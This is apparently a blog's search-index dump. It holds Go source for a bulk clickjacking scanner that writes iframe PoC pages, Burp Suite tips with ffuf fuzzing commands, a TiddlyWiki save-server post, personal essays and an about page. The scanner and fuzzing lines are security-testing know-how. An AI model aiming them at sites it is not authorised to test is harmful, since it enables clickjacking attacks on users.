os.Open(options.headersFile) if err != nil { throwErr(\u0026#34;打开自定义header文件失败\u0026#34;, err) } scanner := bufio.NewScanner(finput) for scanner.Scan() { headerstring := scanner.Text() colon_index := strings.Index(headerstring, \u0026#34;:\u0026#34;) if colon_index == -1 { throwErr(\u0026#34;自定义请求头格式有误\u0026#34;, nil) } key := headerstring[:colon_index] value := headerstring[colon_index+1:] customHeaders = append(customHeaders, customHeader{key, value}) } } } func throwErr(errdesc string, err error) { fmt.Fprintln(os.Stderr, strings.Repeat(\u0026#34;-\u0026#34;, 50)) fmt.Fprintln(os.Stderr, errdesc) if err != nil { fmt.Fprintln(os.Stderr, err.Error()) } fmt.Fprintln(os.Stderr, strings.Repeat(\u0026#34;-\u0026#34;, 50)) } func genClickjackingPoC(u string) string { uu, err := url.Parse(u) if err != nil { fmt.Fprintln(os.Stderr, \u0026#34;为 %s 生成PoC时出现错误 [%s]\u0026#34;, u, err) } pocName := fmt.Sprintf(\u0026#34;%s_%x.html\u0026#34;, uu.Host, md5.Sum([]byte(u))) pocFilename := path.Join(PoCdir, pocName) poc := fmt.Sprintf(` \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;PoC of Clickjacking\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 align=\u0026#34;center\u0026#34;\u0026gt;Batch Detect Clickjacking\u0026lt;/h1\u0026gt; \u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; this site is vulnerable: \u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;%s\u0026#34;\u0026gt;%s\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;iframe src=\u0026#34;%s\u0026#34; height=\u0026#34;80%\u0026#34; width=\u0026#34;80%\u0026#34; align=\u0026#34;middle\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; `, u, u, u) f, err := os.Create(pocFilename) if err != nil { throwErr(\u0026#34;创建PoC文件时出错\u0026#34;, err) } f.WriteString(poc) f.Close() return pocName } func is_vuln_to__clickjacking(url string) int { req, err := http.NewRequest(\u0026#34;GET\u0026#34;, url, nil) if err != nil { throwErr(\u0026#34;构造请求时出现错误：\u0026#34;, err) return 2 // 链接请求失败，需要进一步手工检查 } req.Header.Add(\u0026#34;User-Agent\u0026#34;, options.useragent) for _, header := range customHeaders { req.Header.Add(header.key, header.value) } resp, err := client.Do(req) if err != nil { throwErr(\u0026#34;发起请求时出现错误：\u0026#34;, err) return 2 // 链接请求失败，需要进一步手工检查 } //被 defer 的函数在 return 之后执行，用于释放资源 defer resp.Body.Close() //body, err := io.ReadAll(resp.Body) if len(resp.Header[\u0026#34;X-Frame-Options\u0026#34;]) == 0 { if options.generatePoC { fmt.Println(\u0026#34;[vul]\\t\u0026#34; + url + \u0026#34;\\t\u0026#34; + genClickjackingPoC(url)) } else { fmt.Println(\u0026#34;[vul]\\t\u0026#34; + url) } return 1 // 响应头没有XFO，确认受点击劫持漏洞影响 } else { if options.Silent == false { // 打印出具体的响应XFO头，便于人工判断 fmt.Println(fmt.Sprintf(\u0026#34;[nop]\\t%s\\t[%d]%s\u0026#34;, url, resp.StatusCode, resp.Header[\u0026#34;X-Frame-Options\u0026#34;][0])) //fmt.Println(resp.Header) //fmt.Println(resp.StatusCode) } return 0 // 响应头有XFO，认为不受漏洞影响 // todo: 这里可以细分检测，比如XFO值是什么的时候还是可能有漏洞 sameorigin则没有漏洞 // todo: 有时域名无法解析，但响应头居然有xfo:deny，不知道是不是net/http自己加的，这个现象有点怪。 } } func batch_detect_clickjacking() { batchurl_filename := options.InputFile var scanner *bufio.Scanner if batchurl_filename != \u0026#34;\u0026#34; { finput, _ := os.Open(batchurl_filename) scanner = bufio.NewScanner(finput) } else { scanner = bufio.NewScanner(os.Stdin) } var wg sync.WaitGroup var ch = make(chan struct{}, options.threads) for scanner.Scan() { u, err := url.Parse(scanner.Text()) if err != nil { fmt.Fprintf(os.Stderr, \u0026#34;failed to parse url %s [%s]\\n\u0026#34;, scanner.Text(), err) continue } wg.Add(1) ch \u0026lt;- struct{}{} // acquire a token go func(url string) { defer wg.Done() is_vuln_to__clickjacking(url) \u0026lt;-ch // release the token }(u.String()) } wg.Wait() } func main() { fmt.Fprintln(os.Stderr, banner) options = parse_options() global_init() batch_detect_clickjacking() } v1 早期单线程版本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 package uispoof import ( \u0026#34;bufio\u0026#34; \u0026#34;crypto/tls\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) // banner //https://manytools.org/hacker-tools/ascii-banner/ // Rounded font const banner = ` ______ _ ______ (____ \\ _ | | (______) _ _ ____) )_____ _| |_ ____| |__ _ _ _____ _| |_ _____ ____ _| |_ | __ ((____ (_ _) ___) _ \\ | | | | ___ (_ _) ___ |/ ___|_ _) | |__) ) ___ | | |( (___| | | | | |__/ /| ____| | |_| ____( (___ | |_ |______/\\_____| \\__)____)_| |_| |_____/ |_____) \\__)_____)\\____) \\__) _______ _ _ _ _ _ _ (_______) |(_) | | (_) | | (_) _ | | _ ____| | _ _ _____ ____| | _ _ ____ ____ | | | || |/ ___) |_/ )| (____ |/ ___) |_/ ) | _ \\ / _ | | |_____| || ( (___| _ ( | / ___ ( (___| _ (| | | | ( (_| | \\______)\\_)_|\\____)_| \\_)| \\_____|\\____)_| \\_)_|_| |_|\\___ | (__/ (_____| by findneo ` // options type Options struct { mode string InputFile string Verbose bool threads int useragent string proxy string } var options *Options func parse_options() *Options { options := \u0026amp;Options{} flag.StringVar(\u0026amp;options.mode, \u0026#34;m\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;find404|fmtjs|newjs\u0026#34;) flag.StringVar(\u0026amp;options.InputFile, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;file contains url stirngs\u0026#34;) flag.BoolVar(\u0026amp;options.Verbose, \u0026#34;v\u0026#34;, false, \u0026#34;show X-Frame-Options header content in response\u0026#34;) flag.IntVar(\u0026amp;options.threads, \u0026#34;t\u0026#34;, 10, \u0026#34;limit concurrent threads num\u0026#34;) flag.StringVar(\u0026amp;options.useragent, \u0026#34;u\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\u0026#34;, \u0026#34;Custom User agent\u0026#34;) flag.StringVar(\u0026amp;options.proxy, \u0026#34;x\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Custom proxy like http://127.0.0.1:8080\u0026#34;) flag.Parse() return options } var tr *http.Transport var client *http.Client func global_init(){ //fmt.Fprintln(os.Stderr,banner) tr = \u0026amp;http.Transport{ MaxIdleConns: 10, IdleConnTimeout: 30 * time.Second, DisableCompression: true, TLSClientConfig: \u0026amp;tls.Config{ InsecureSkipVerify: true, }, DisableKeepAlives: true, } // 如果指定了proxy，则所有请求都使用该proxy if options.proxy!=\u0026#34;\u0026#34;{ proxyUrl, err := url.Parse(options.proxy) if err!=nil{ fmt.Fprintln(os.Stderr,\u0026#34;自定义的proxy格式有误，不设置代理\u0026#34;) } else{ tr.Proxy=http.ProxyURL(proxyUrl) } } client = \u0026amp;http.Client{Transport: tr} } func is_vuln_to__clickjacking(url string) int{ req,err:=http.NewRequest(\u0026#34;GET\u0026#34;,url,nil) if err != nil{ fmt.Fprintln(os.Stderr,\u0026#34;构造请求时出现错误：\u0026#34;) fmt.Fprintln(os.Stderr,strings.Repeat(\u0026#34;-\u0026#34;,50)) fmt.Fprintln(os.Stderr,err.Error()) fmt.Fprintln(os.Stderr,strings.Repeat(\u0026#34;-\u0026#34;,50)) return 2 // 链接请求失败，需要进一步手工检查 } req.Header.Add(\u0026#34;User-Agent\u0026#34;,options.useragent) resp, err := client.Do(req) if err != nil { fmt.Fprintln(os.Stderr,\u0026#34;发起请求时出现错误：\u0026#34;) fmt.Fprintln(os.Stderr,strings.Repeat(\u0026#34;-\u0026#34;,50)) fmt.Fprintln(os.Stderr,err.Error()) fmt.Fprintln(os.Stderr,strings.Repeat(\u0026#34;-\u0026#34;,50)) return 2 // 链接请求失败，需要进一步手工检查 } //被 defer 的函数在 return 之后执行，用于释放资源 defer resp.Body.Close() //body, err := io.ReadAll(resp.Body) if len(resp.Header[\u0026#34;X-Frame-Options\u0026#34;])==0 { fmt.Println(\u0026#34;[vul]\u0026#34;+url) return 1 // 响应头没有XFO，确认受点击劫持漏洞影响 }else{ if options.Verbose==true{ // 打印出具体的响应XFO头，便于人工判断 fmt.Println(\u0026#34;[nop]\u0026#34;+url+\u0026#34;\\t[\u0026#34;+fmt.Sprintf(\u0026#34;%d\u0026#34;,resp.StatusCode)+\u0026#34;]\u0026#34;+resp.Header[\u0026#34;X-Frame-Options\u0026#34;][0]) //fmt.Println(resp.Header) //fmt.Println(resp.StatusCode) } return 0 // 响应头有XFO，认为不受漏洞影响 // todo: 这里可以细分检测，比如XFO值是什么的时候还是可能有漏洞 sameorigin则没有漏洞 } } func batch_detect_clickjacking() { sc := bufio.NewScanner(os.Stdin) for sc.Scan() { u, err := url.Parse(sc.Text()) if err != nil { fmt.Fprintf(os.Stderr, \u0026#34;failed to parse url %s [%s]\\n\u0026#34;, sc.Text(), err) continue } is_vuln_to__clickjacking(u.String()) } } func main() { options = parse_options() global_init() batch_detect_clickjacking() } 参考文档 点击劫持防御备忘单 点击劫持攻击 ","permalink":"https://ret2neo.cn/post/210528-click-jacking-batch-detect/","summary":"概述 batchDetectClickjacking可以用于自动化批量检测和利用点击劫持类漏洞。支持\n对多个HTTP站点批量快速检测 对存在点击劫持类漏洞的网站生成利用代码PoC 指定检测时使用的并发线程数 从管道或文件输入被测站点 指定单个网站检测的超时时间 指定检测时使用的网络代理 指定检测时使用的User-Agent 常见用法 1 2 3 4 5 6 7 8 # 检测单个网站链接是否受点击劫持漏洞影响 echo https://www.qq.com | ./batchDetectClickjacking # 检测文件urls.txt中的多个链接 cat urls.txt | ./batchDetectClickjacking # 使用100个线程检测大量url链接，只显示存在漏洞的网站，同时为每个漏洞网站生成PoC ./batchDetectClickjacking -iL urls.txt -s -g -t 100 支持参数 1 2 3 4 5 6 7 8 -h 查看帮助 -g 为存在漏洞的网站生成PoC -iL 指定一个文件，其中包含若干待检测的网站地址，每行一个 -s 只显示存在漏洞的网站；默认情况下还会显示不存在漏洞的网站链接并显示响应头的X-Frame-Options值。 -t 指定检测时候使用的线程数，默认情况下是50个线程 -u 指定发起请求使用的UA，默认情况下是Firefox -w 指定每个请求的超时时间，默认情况下是30s -x 指定发起请求使用的网络代理，可以用于和burpsuite联动 漏洞原理及危害 点击劫持攻击，也称UI覆盖攻击，允许恶意页面以用户的名义点击“受害网站”，欺骗用户进行转账、点赞、关注、转发等操作，或者窃取用户凭据。\n一个典型的利用场景是欺骗用户进行转账、点赞、关注或转发。如果业务网站的某正常功能页面A存在点击劫持漏洞，攻击者可以在恶意网站B中使用iframe标签包含A页面，但将A页面置顶并设为透明，这样用户认为自己在B网站上点击时，实际上是在被欺骗着点击了A网站。从而恶意网站B能够做到以用户名义点击A网站，进行转账、转发等敏感操作。\n另一种典型的利用场景是窃取用户账号密码等身份凭据。如果业务网站的某正常功能页面A存在点击劫持漏洞，攻击者可以在恶意网站B包含A页面，将A页面置底并将B网站设为透明，这样用户认为自己在A网站进行输入时，实际上输入数据会被B网站获取到。\n漏洞修复方法 主要有两种方式可以防御点击劫持，第一种是X-Frame-Options头信息（推荐使用，但可能有些浏览器不支持）；第二种方式是使用javascript编写嵌入阻断代码（代码编写不当时可能被绕过，但当流量经过的某些web代理可能被去掉X-Frame-Options头时可以考虑这种方式）。","title":"点击劫持漏洞的批量检测"},{"content":"多数时候，我是一种现象\n满心妄念，满腹偏见，满口谎言\n游荡人间，执着贪恋，不问明天\n掂量着伟大和渺小，盘算着永恒与刹那\n少数时候，我同情起人类\n便觉着自己，还不算太糟\n此时此刻，我只关心你\n这让我觉得，自己在接近圣人\n","permalink":"https://ret2neo.cn/mind/210528-whoami/","summary":"多数时候，我是一种现象\n满心妄念，满腹偏见，满口谎言\n游荡人间，执着贪恋，不问明天\n掂量着伟大和渺小，盘算着永恒与刹那\n少数时候，我同情起人类\n便觉着自己，还不算太糟\n此时此刻，我只关心你\n这让我觉得，自己在接近圣人","title":"多数时候，我是一种现象"},{"content":"一直在寻找称心的笔记工具，前段时间接触到tiddly wiki，觉得很是不错。因为并非完美的开箱即用，使用过程中还是遇到一些问题，其中一些找到了好的解决办法，有一些实在解决不掉，无奈最终弃坑。\n自动保存 官方提供了很多的保存选项，却实在没有一个真正优雅，要装浏览器插件，装客户端，甚至还有装浏览器的……\nnodejs版勉强能用，实时保存效果极好，但有两个缺点：\n文件分散 安装插件的页面刷不出来，只能靠改配置文件或者去找别人的拖过来。 1 2 3 4 5 npm install -g tiddlywiki tiddlywiki --version // 5.1.23 tiddlywiki mywiki --init server tiddlywiki mywiki --listen port=1337 最终找到一种比较满意的保存方式。\n参考 jimfoltz/tw5-server.rb 脚本略作修改，监听localhost，去除日志。\n将以下文件保存为/path/to/wikiserv.rb，配置root和BACKUP_DIR的值，并把wiki.html放到root对应的目录下。 建个软链接 ln -s /path/to.wikiserv.rb ~/wiki 在home目录执行 ruby wiki\u0026amp; ，访问http://localhost:1337/wiki.html 保存时会备份一份到BACKUP_DIR 目录下。 用坚果云同步root对应的目录，Windows下可结合WSL使用。 使用插件 $:/plugins/telmiger/EditorCounter ，每输入一定数量的字符就自动保存一次。 wikiserv.rb ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # 参考：https://gist.github.com/jimfoltz/ee791c1bdd30ce137bc23cce826096da require \u0026#39;webrick\u0026#39; require \u0026#39;fileutils\u0026#39; if ARGV.length == 0 # root = ARGV.first.gsub(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;) root = \u0026#39;/mnt/d/我的坚果云/tiddly\u0026#39; #config else root = \u0026#39;.\u0026#39; end BACKUP_DIR = \u0026#39;/mnt/d/wiki/bak\u0026#39;\t#config module WEBrick module HTTPServlet class FileHandler alias do_PUT do_GET end class DefaultFileHandler def do_PUT(req, res) file = \u0026#34;#{@config[:DocumentRoot]}#{req.path}\u0026#34; res.body = \u0026#39;\u0026#39; unless Dir.exists? BACKUP_DIR Dir.mkdir BACKUP_DIR end FileUtils.cp(file, \u0026#34;#{BACKUP_DIR}/#{File.basename(file, \u0026#39;.html\u0026#39;)}.#{Time.now.to_i.to_s}.html\u0026#34;) File.open(file, \u0026#34;w+\u0026#34;) {|f| f.puts(req.body)} end def do_OPTIONS(req, res) res[\u0026#39;allow\u0026#39;] = \u0026#34;GET,HEAD,POST,OPTIONS,CONNECT,PUT,DAV,dav\u0026#34; res[\u0026#39;x-api-access-type\u0026#39;] = \u0026#39;file\u0026#39; res[\u0026#39;dav\u0026#39;] = \u0026#39;tw5/put\u0026#39; end end end end # https://ruby-doc.org/stdlib-2.5.1/libdoc/webrick/rdoc/WEBrick/HTTPServer.html server = WEBrick::HTTPServer.new({:BindAddress =\u0026gt; \u0026#34;localhost\u0026#34;, :Port =\u0026gt; 1337, :DocumentRoot =\u0026gt; root, :Logger=\u0026gt; WEBrick::Log.new(\u0026#34;/dev/null\u0026#34;),:AccessLog=\u0026gt; []}) trap \u0026#34;INT\u0026#34; do puts \u0026#34;Shutting down...\u0026#34; server.shutdown end server.start 搜索增强 每当输入一定数量的字符后就自动保存，这个还挺酷的。$:/plugins/telmiger/EditorCounter $:/plugins/telmiger/simple-search ，配合vimium chrome插件搜索还是比较方便的。 搜索结果高亮 $:/plugins/bimlas/highlight-searched-text @github demo 如果是和$:/plugins/telmiger/simple-search一起用需要在设置里面把$:/temp/search改为$:/temp/advancedsearch。 其他重度用户等 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 http://cpashow.tiddlyspot.com/ https://rizi.me/ https://onetwo.ren/wiki/#:Index https://github.com/linonetwo/Tiddlywiki-NodeJS-Github-Template https://onetwo.ren/用tiddlywiki替代notion和evernote管理知识/ https://onetwo.ren/wiki/#:其他在积极使用TiddlyWiki的朋友的wiki https://wiki.hintsnet.com/ https://swarma-km.hintsnet.com/ https://wiki.yfd.im/ https://hintsnet.com/digital-garden/ 其他相关链接： http://telooon.tiddlyspot.com/#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5 中文tiddlywiki讨论组：http://groups.google.com/group/TiddlyWiki-zh?hl=zh-TW tiddlywikitools：http://www.tiddlytools.com/ 语法 https://tiddlywiki.com/#WikiText https://dynalist.io/d/zUP-nIWu2FFoXH-oM7L7d9DM http://blog.dimpurr.com/tiddly-wiki/ https://tid.li/tw5/plugins.html https://tid.li/tw5/plugins-2019.html https://wikilabs.github.io/ https://github.com/wikilabs/plugins https://tiddlywiki.com/static/Customising%2520search%2520results.html todo: https://tiddlywiki.com/#TaskManagementExample https://zhuanlan.zhihu.com/p/140473235 https://t.me/joinchat/Ag98F0DdcZr1X1xS6lJsyA https://github.com/DiamondYuan/wiki/issues/3 https://github.com/DiamondYuan/wiki https://github.com/DiamondYuan/wiki/issues/1 https://github.com/linonetwo/wiki https://wiki.xiang578.com/#:Index 以及博客里面提到的人 https://github.com/tiddly-gittly/TiddlyGit-Desktop https://roulesophy.github.io/ https://zhuanlan.zhihu.com/p/346647657 https://www.zhihu.com/column/c_1336636082004881409 https://tobibeer.github.io/tw/filters/#Filter%20Examples 缺点 搜索。没有vscode好用。 插件质量良莠不齐。装了几个插件，一些地方就不按预期工作了，找不出原因。 资料少。tiddly wiki这个关键字在Google上的搜索结果简直是一场灾难。 于是弃坑。\n","permalink":"https://ret2neo.cn/post/210323-how-to-save-tiddly-wiki/","summary":"一直在寻找称心的笔记工具，前段时间接触到tiddly wiki，觉得很是不错。因为并非完美的开箱即用，使用过程中还是遇到一些问题，其中一些找到了好的解决办法，有一些实在解决不掉，无奈最终弃坑。\n自动保存 官方提供了很多的保存选项，却实在没有一个真正优雅，要装浏览器插件，装客户端，甚至还有装浏览器的……\nnodejs版勉强能用，实时保存效果极好，但有两个缺点：\n文件分散 安装插件的页面刷不出来，只能靠改配置文件或者去找别人的拖过来。 1 2 3 4 5 npm install -g tiddlywiki tiddlywiki --version // 5.1.23 tiddlywiki mywiki --init server tiddlywiki mywiki --listen port=1337 最终找到一种比较满意的保存方式。\n参考 jimfoltz/tw5-server.rb 脚本略作修改，监听localhost，去除日志。\n将以下文件保存为/path/to/wikiserv.rb，配置root和BACKUP_DIR的值，并把wiki.html放到root对应的目录下。 建个软链接 ln -s /path/to.wikiserv.rb ~/wiki 在home目录执行 ruby wiki\u0026amp; ，访问http://localhost:1337/wiki.html 保存时会备份一份到BACKUP_DIR 目录下。 用坚果云同步root对应的目录，Windows下可结合WSL使用。 使用插件 $:/plugins/telmiger/EditorCounter ，每输入一定数量的字符就自动保存一次。 wikiserv.rb ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # 参考：https://gist.","title":"如何保存tiddlywiki"},{"content":" filter： 根据MIME Type、状态码、后缀、注释、正则、端口来过滤要显示的内容。 @target-sitemap-filter @proxy-httphistory-filter search： @target-sitemap-engagement tool @target-sitemap-filter @proxy-httphistory-filter @burp-search @message editor regex。 ^(?\u0026lt;=http)(?:www)\\w\\W\\s\\S+\\.\\*\\?\\t\\n\\r(?\u0026lt;name\u0026gt;cool)[0-9a-zA-Z](?#foobar)[^\\d]\\b\\.*?(hunter|honor){6,8}(?!2333)$ 元字符、转义、重复、字符类、分支、分组、反义、零宽断言、后向引用、贪婪匹配等 学习与测试正则表达式：https://regexr.com/ scope： eg1, include hihonor eg2, include .* ，exclude .*google.* remove from scope @proxy-httphistory @target-sitemap toggle scope wherever search/filter is available only record inscope items @proxy-option-misc hotkey： ctrl+(-|=|a|b|c|d|i|r|s|u|v|x|y|z) ctrl+shift+(b|d|h|i|p|r|t|u|v) @user option-misc-hotkeys multi proxy listener \u0026amp; filter/search by port @proxy-option download ca from http://burp highlight/comment history item reponse modification. eg:unhide hidden filed @proxy-option match and replace. eg: replace cookie @proxy-option misc: unpack gzip in requests, useful in traffic from mobile device @proxy-option-misc uncheck payload encoding @intruder-payloads grep to match/extract @intruder-option copy url/ paste url as request @repeater url encode as typing @repeater show response in browser @repeater tab rename @repeater gen csrf poc @repeater-engagement tools decoder：url/html/base64/hex/octol/binary/gzip comparer：text/hex ; syncviews upstream proxy server：与burp/awvs/lspider/crawlergo等联动 @user options-connections update burp / install bapp via proxy @useroptions-connections-socksproxy 乱码/指针错位：中文字体、等宽字体、默认字符集@user option -display extender: https://github.com/bit4woo/knife 添加了很多便于使用的小功能 JSON Web Tokens 识别存在JWT的请求；解码；验证JWT有效期 Logger++ / flow 记录所有tool的流量；正则支持更强；缺点是重启会清空记录 decompressor 修改GZIP压缩的请求并重新封装 bookmarks 收藏某些请求 js-link-finder 分析JS发现更多endpoint log-requests-to-sqlite 把请求存储到sqlite RetireJS 识别存在漏洞的js库 HTTP Request Smuggler 请求夹带类漏洞探测和利用 https://github.com/snoopysecurity/awesome-burp-extensions ext dev: press ctrl while toggle to reload ext fastly @burp collaborator http \u0026amp; dns listening server with ffuf ffuf -c -w seclistpath.txt:path -w alive.txt:url -u \u0026quot;url/path\u0026quot; -mc 200 -replay-proxy http://127.0.0.1:8080 rg -Io \u0026quot;https?://[\\w.-]*honor[\\w/:.-]*/[\\w/:.-]+\\.js\u0026quot; sdb |sort -u|ffuf -r -c -u FUZZ -w - -x http://127.0.0.1:8080 rg -Io \u0026quot;https?://[\\w.-]*honor[\\w/:.-]*/[\\w/:.-]+\\.js\u0026quot; sdb |sort -u|ffuf -r -c -u FUZZ -w - -replay-proxy http://127.0.0.1:8080 ","permalink":"https://ret2neo.cn/post/210225-burp-advanced-trick/","summary":"filter： 根据MIME Type、状态码、后缀、注释、正则、端口来过滤要显示的内容。 @target-sitemap-filter @proxy-httphistory-filter search： @target-sitemap-engagement tool @target-sitemap-filter @proxy-httphistory-filter @burp-search @message editor regex。 ^(?\u0026lt;=http)(?:www)\\w\\W\\s\\S+\\.\\*\\?\\t\\n\\r(?\u0026lt;name\u0026gt;cool)[0-9a-zA-Z](?#foobar)[^\\d]\\b\\.*?(hunter|honor){6,8}(?!2333)$ 元字符、转义、重复、字符类、分支、分组、反义、零宽断言、后向引用、贪婪匹配等 学习与测试正则表达式：https://regexr.com/ scope： eg1, include hihonor eg2, include .* ，exclude .*google.* remove from scope @proxy-httphistory @target-sitemap toggle scope wherever search/filter is available only record inscope items @proxy-option-misc hotkey： ctrl+(-|=|a|b|c|d|i|r|s|u|v|x|y|z) ctrl+shift+(b|d|h|i|p|r|t|u|v) @user option-misc-hotkeys multi proxy listener \u0026amp; filter/search by port @proxy-option download ca from http://burp highlight/comment history item reponse modification. eg:unhide hidden filed @proxy-option match and replace.","title":"burp进阶技巧"},{"content":"年已过完，寂静夜里，思绪凌乱。\n从前执迷不朽，四下质问，高声低语，尔后喋喋不休，自言自语，自斟自酌。如今昏然无知，只觉得不朽可以是文字、音乐、公式、定律、图画，可以是易凋但绝美的容颜、朝不知暮但可爱迷人的眼眸、相拥的温度、耳畔的鼻息，也可以是漫天的繁星、夏日的雷鸣。不朽在一切美丽刹那，美丽在一切欲望之中。\n欲望与生命力互为表里。欲望是填充，是企图理解、渴望占有，是用真理填充无知，用声色填充五官。虽然理解只限于可理解，占有只限于可占有，这令人沮丧，但若zoom in，欲望越强，生命力就将越强。而这鲜活跃动的世界，就由无尽欲望构筑而成。抛弃生存之必要幻觉的代价是生存本身，所以每一个继续存在的个体，面对必然通向死亡的每一条人生道路与每一种生活方式，都必须做出选择，也已然做出选择。顺利做出选择，剩下的就是与欲望为主、为友或为仆的问题。\n美源于稀缺，短暂和稀少是一切美值得一提的必要条件。不朽即永恒，永恒不美，甚至乏味。故而一切寓永恒之不朽于刹那之美的尝试可视为缘木求鱼，或自欺或欺人或兼有。\n无数魂灵世间行走，我是其一，那些美丑，我也愿一睹。那么，新年快乐。\n","permalink":"https://ret2neo.cn/mind/210218-flowing-reaches-nowhere/","summary":"年已过完，寂静夜里，思绪凌乱。\n从前执迷不朽，四下质问，高声低语，尔后喋喋不休，自言自语，自斟自酌。如今昏然无知，只觉得不朽可以是文字、音乐、公式、定律、图画，可以是易凋但绝美的容颜、朝不知暮但可爱迷人的眼眸、相拥的温度、耳畔的鼻息，也可以是漫天的繁星、夏日的雷鸣。不朽在一切美丽刹那，美丽在一切欲望之中。\n欲望与生命力互为表里。欲望是填充，是企图理解、渴望占有，是用真理填充无知，用声色填充五官。虽然理解只限于可理解，占有只限于可占有，这令人沮丧，但若zoom in，欲望越强，生命力就将越强。而这鲜活跃动的世界，就由无尽欲望构筑而成。抛弃生存之必要幻觉的代价是生存本身，所以每一个继续存在的个体，面对必然通向死亡的每一条人生道路与每一种生活方式，都必须做出选择，也已然做出选择。顺利做出选择，剩下的就是与欲望为主、为友或为仆的问题。\n美源于稀缺，短暂和稀少是一切美值得一提的必要条件。不朽即永恒，永恒不美，甚至乏味。故而一切寓永恒之不朽于刹那之美的尝试可视为缘木求鱼，或自欺或欺人或兼有。\n无数魂灵世间行走，我是其一，那些美丑，我也愿一睹。那么，新年快乐。","title":"如烟"},{"content":"NOW 写作：在写系列文章《黑盒渗透测试全流程优化》、《Java代码审计全流程优化》\n编程：在写个人渗透测试工作台\n生活：自重训练；学做饭菜\nABOUT 我的目标是成为一流的安全专家、生活黑客。\nSLOGAN 全站快捷键 本站全站支持如下快捷键：\n1 2 3 4 5 Alt + H 回到首页，back Home Alt + T 切换主题，change Theme Alt + / 全站搜索 Alt + G 回到页顶，go to Top Alt + C 展开和收起目录,Collapse toc 一些导航 社科知识库 毛泽东选集：https://ret2neo.cn/MaoZeDongAnthology/ 鲁迅日记：https://ret2neo.cn/p/luxun-diary.html TombKeeper部分微博：https://ret2neo.cn/p/tkposts.html 猪猪侠部分微博：https://ret2neo.cn/p/wy.html 我的读书观影历史 《高效能人士的七个习惯》之以终为始：https://ret2neo.cn/p/7habits/2.html 我的观影史：https://ret2neo.cn/p/movie2_20210802.html 安全知识库 乌云知识库：https://ret2neo.cn/WooyunDrops/ 在线安全工具 实时编解码工具：https://ret2neo.cn/kt/tools.html xssee：https://ret2neo.cn/xssee/ cyberchef：https://ret2neo.cn/p/cyberchef.htm 一些推荐 科学上网 https://user.by.ltd/aff.php?aff=6679\n购买域名 https://www.namesilo.com/?rid=2cb1d91bs\n购买VPS https://my.racknerd.com/aff.php?aff=7875\n套壳AI https://ai.ashuiai.com/auth/register?inviteCode=CQGTWBOBQK\n友链 胡涂说：任抛星汉归园圃，留取乾坤盛酒囊 Derek Sivers Owen chybeta ","permalink":"https://ret2neo.cn/about/","summary":"NOW 写作：在写系列文章《黑盒渗透测试全流程优化》、《Java代码审计全流程优化》\n编程：在写个人渗透测试工作台\n生活：自重训练；学做饭菜\nABOUT 我的目标是成为一流的安全专家、生活黑客。\nSLOGAN 全站快捷键 本站全站支持如下快捷键：\n1 2 3 4 5 Alt + H 回到首页，back Home Alt + T 切换主题，change Theme Alt + / 全站搜索 Alt + G 回到页顶，go to Top Alt + C 展开和收起目录,Collapse toc 一些导航 社科知识库 毛泽东选集：https://ret2neo.cn/MaoZeDongAnthology/ 鲁迅日记：https://ret2neo.cn/p/luxun-diary.html TombKeeper部分微博：https://ret2neo.cn/p/tkposts.html 猪猪侠部分微博：https://ret2neo.cn/p/wy.html 我的读书观影历史 《高效能人士的七个习惯》之以终为始：https://ret2neo.cn/p/7habits/2.html 我的观影史：https://ret2neo.cn/p/movie2_20210802.html 安全知识库 乌云知识库：https://ret2neo.cn/WooyunDrops/ 在线安全工具 实时编解码工具：https://ret2neo.cn/kt/tools.html xssee：https://ret2neo.cn/xssee/ cyberchef：https://ret2neo.cn/p/cyberchef.htm 一些推荐 科学上网 https://user.by.ltd/aff.php?aff=6679\n购买域名 https://www.namesilo.com/?rid=2cb1d91bs\n购买VPS https://my.racknerd.com/aff.php?aff=7875\n套壳AI https://ai.ashuiai.com/auth/register?inviteCode=CQGTWBOBQK\n友链 胡涂说：任抛星汉归园圃，留取乾坤盛酒囊 Derek Sivers Owen chybeta ","title":"关于我"},{"content":" 